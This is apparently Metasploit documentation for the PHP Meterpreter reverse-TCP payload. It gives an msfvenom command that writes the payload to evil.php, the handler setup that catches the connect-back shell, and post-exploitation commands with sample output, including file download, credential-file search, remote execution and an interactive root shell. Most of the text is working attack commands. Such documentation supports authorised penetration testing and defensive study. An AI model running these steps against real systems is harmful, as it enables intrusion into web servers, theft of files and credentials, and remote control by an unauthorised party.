The php/meterpreter/reverse_tcp is a staged payload used to gain meterpreter access to a compromised system. This is a unique payload in the Metasploit Framework because this payload is one of the only payloads that are used in RFI vulnerabilities in web apps. This module _can_ be cross platform, but the target needs to be able to run php code.


## Vulnerable Application

  The PHP Meterpreter is suitable for any system that supports PHP. For example, the module can be used against webservers which run PHP code for a website. OS X has PHP installed by default.

## Deploying php/meterpreter/reverse_tcp
### Scenarios

  Specific demo of using the module that might be useful in a real world scenario.

#### Generating a file with msfvenom
  ```
  msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o evil.php
  ```


#### Starting a listener
  ```
msf > use multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST [IP]
LHOST => [IP]
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > exploit

[*] Started reverse TCP handler on [IP]
  ```
  
## Important Basic Commands

Compared to a native Meterpreter such as windows/meterpreter/reverse_tcp, the PHP Meterpreter
has less commands, but here's a list of all the common ones you might need:

**pwd command**

The ```pwd``` command tells you the current working directory. For example:

```
meterpreter > pwd
/Users/thecarterb/Desktop
```

**cd command**

The ```cd``` command allows you to change directories. Example:

```
meterpreter > cd /Users/thecarterb/Desktop
meterpreter > pwd
/Users/thecarterb/Desktop
```

**cat command**

The ```cat``` command allows you to see the content of a file:

```
meterpreter > cat /tmp/data.txt
Hello World!
```

**upload command**

The ```upload``` command allows you to upload a file to the remote target. This is useful for uploading additional payload files. For example:

```
meterpreter > upload /tmp/data.txt /Users/thecarterb/Desktop
[*] uploading  : /tmp/data.txt -> /Users/thecarterb/Desktop
[*] uploaded   : /tmp/data.txt -> /Users/thecarterb/Desktop/data.txt
meterpreter >
```

**download command**

The ```download``` command allows you to download a file from the remote target to your machine.
For example:

```
meterpreter > download /Users/thecarterb/Desktop/data.txt /tmp/pass.txt
[*] downloading: /Users/thecarterb/Desktop/data.txt -> /tmp/pass.txt/data.txt
[*] download   : /Users/thecarterb/Desktop/data.txt -> /tmp/pass.txt/data.txt
meterpreter >
```

**search command**

The ```search``` command allows you to find files on the remote file system. For example,
this shows how to find all text files in the current directory:

```
meterpreter > search -d . -f *.txt
Found 2 results...
    .\pass.txt (13 bytes)
    ./creds\data.txt (83 bytes)
meterpreter >
```

Without the ```-d``` option, the command will attempt to search in all drives.

The ```-r``` option for the command allows you to search recursively.


**getuid command**

The ```getuid``` command tells you the current user that Meterpreter is running on. For example:

```
meterpreter > getuid
Server username: root
```

**execute command**

The ```execute``` command allows you to execute a command or file on the remote machine.

The following examples uses the command to create a text file:

```
meterpreter > execute -f echo -a "hello > /tmp/hello.txt"
Process 73642 created.
meterpreter >
```

**ps command**

The ```ps``` command lists the running processes on the remote machine.

**shell command**

The ```shell``` command allows you to interact with the remote machine's command prompt (or shell).
For example:

```
meterpreter > shell
Process 74513 created.
Channel 2 created.
sh-3.2#
```

If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.

**sysinfo**

The ```sysinfo``` command shows you basic information about the remote machine. Such as:

* Computer name
* OS name
* Architecture
* Meterpreter type

## Using `post` modules
When using the PHP Meterpreter, you have the feature of using Metasploit's `post` modules on that specific session. By default, most `multi` post modules will work; however, you can also use OS specific modules depending on the OS of the compromised system. For example, if you have a PHP Meterpreter session running on OS X, you can use `osx` post modules on that session. 

  __Don't forget to:__
  - Set the `LHOST` datastore option to the connect-back IP Address
  - If you want to get multiple shells, set `ExitOnSession` to `false`
